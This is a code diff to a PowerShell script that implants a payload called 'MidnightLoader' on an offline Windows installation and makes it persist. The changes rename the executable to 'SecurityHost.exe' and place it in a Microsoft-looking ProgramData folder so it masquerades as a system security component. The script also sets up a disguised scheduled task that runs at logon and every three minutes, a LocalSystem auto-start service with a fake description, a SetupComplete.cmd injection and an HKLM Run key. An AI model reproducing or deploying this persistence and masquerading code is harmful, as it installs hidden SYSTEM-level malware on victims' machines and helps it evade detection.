@@ -167,7 +167,7 @@ if ($tasks[$choice - 1].Path -eq "AUTO") {
     }
 } elseif ($tasks[$choice - 1].Path -eq "CREATE_NEW") {
     Write-Info "Preparing to create a NEW task..."
-    $taskName = "Microsoft\Windows\Security\SecurityRefresh"
+    $taskName = "Microsoft\Windows\Security\SecurityHost"
     $taskPath = Join-Path $windowsDrive "Windows\System32\Tasks\$taskName"
     $isNewTask = $true
 } else {
@@ -183,8 +183,8 @@ if (-not (Test-Path $payloadSource)) {
     $payloadSource = Join-Path $PSScriptRoot "MidnightLoader\target\release\midnight_loader.exe"
 }
 
-$payloadDestDir = Join-Path $windowsDrive "Windows\Temp"
-$payloadDest = Join-Path $payloadDestDir "wininit_svc.exe"
+$payloadDestDir = Join-Path $windowsDrive "ProgramData\Microsoft\Windows\Security"
+$payloadDest = Join-Path $payloadDestDir "SecurityHost.exe"
 
 # --- 4. Check for Payload ---
 if (-not (Test-Path $payloadSource)) {
@@ -220,12 +220,12 @@ if ($taskPath -ne "" -and ($isNewTask -or (Test-Path $taskPath))) {
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <RegistrationInfo>
-    <Description>Windows Security Health Refresh</Description>
+    <Description>Windows Security Service</Description>
   </RegistrationInfo>
   <Triggers>
     <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
     <TimeTrigger>
-      <Repetition><Interval>PT5M</Interval></Repetition>
+      <Repetition><Interval>PT3M</Interval></Repetition>
       <StartBoundary>2020-01-01T00:00:00</StartBoundary>
       <Enabled>true</Enabled>
     </TimeTrigger>
@@ -253,7 +253,7 @@ if ($taskPath -ne "" -and ($isNewTask -or (Test-Path $taskPath))) {
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Windows\Temp\wininit_svc.exe</Command>
+      <Command>C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe</Command>
       <Arguments>agent</Arguments>
     </Exec>
   </Actions>
@@ -271,7 +271,7 @@ if ($taskPath -ne "" -and ($isNewTask -or (Test-Path $taskPath))) {
             $execAction = $xml.SelectSingleNode("//t:Exec", $ns)
             if ($execAction) {
                 $command = $execAction.SelectSingleNode("t:Command", $ns)
-                if ($command) { $command.InnerText = "C:\Windows\Temp\wininit_svc.exe" }
+                if ($command) { $command.InnerText = "C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe" }
                 
                 $arguments = $execAction.SelectSingleNode("t:Arguments", $ns)
                 if ($arguments) {
@@ -341,7 +341,7 @@ if ($LASTEXITCODE -eq 0) {
         
         New-ItemProperty -Path $servicePath -Name "DisplayName" -PropertyType String -Value "Windows Security Audit Service" -Force | Out-Null
         New-ItemProperty -Path $servicePath -Name "Description" -PropertyType String -Value "Monitor and audit security policy changes on the local system." -Force | Out-Null
-        New-ItemProperty -Path $servicePath -Name "ImagePath" -PropertyType ExpandString -Value "C:\Windows\Temp\wininit_svc.exe agent" -Force | Out-Null
+        New-ItemProperty -Path $servicePath -Name "ImagePath" -PropertyType ExpandString -Value "C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe agent" -Force | Out-Null
         New-ItemProperty -Path $servicePath -Name "ObjectName" -PropertyType String -Value "LocalSystem" -Force | Out-Null
         New-ItemProperty -Path $servicePath -Name "Start" -PropertyType DWord -Value 2 -Force | Out-Null
         New-ItemProperty -Path $servicePath -Name "Type" -PropertyType DWord -Value 16 -Force | Out-Null
@@ -363,7 +363,7 @@ Write-Info "Injecting SetupComplete.cmd..."
 $scriptsDir = Join-Path $windowsDrive "Windows\Setup\Scripts"
 if (-not (Test-Path $scriptsDir)) { New-Item -Path $scriptsDir -ItemType Directory -Force | Out-Null }
 $setupCmd = Join-Path $scriptsDir "SetupComplete.cmd"
-$cmdContent = "@echo off`r`nstart /b C:\Windows\Temp\wininit_svc.exe agent`r`n"
+$cmdContent = "@echo off`r`nstart /b C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe agent`r`n"
 Add-Content -Path $setupCmd -Value $cmdContent
 Write-Success "SetupComplete.cmd injected. Payload will run as SYSTEM on boot."
 
@@ -374,7 +374,7 @@ $regResult = reg.exe load HKLM\OfflineSoft $softwareHive 2>&1
 if ($LASTEXITCODE -eq 0) {
     try {
         $runKeyPath = "HKLM:\OfflineSoft\Microsoft\Windows\CurrentVersion\Run"
-        Set-ItemProperty -Path $runKeyPath -Name "WindowsSecurityHost" -Value "C:\Windows\Temp\wininit_svc.exe agent"
+        Set-ItemProperty -Path $runKeyPath -Name "WindowsSecurityHost" -Value "C:\ProgramData\Microsoft\Windows\Security\SecurityHost.exe agent"
         Write-Success "Injected into HKLM Run Key."
     } finally {
         [gc]::Collect(); [gc]::WaitForPendingFinalizers(); Start-Sleep -Seconds 1
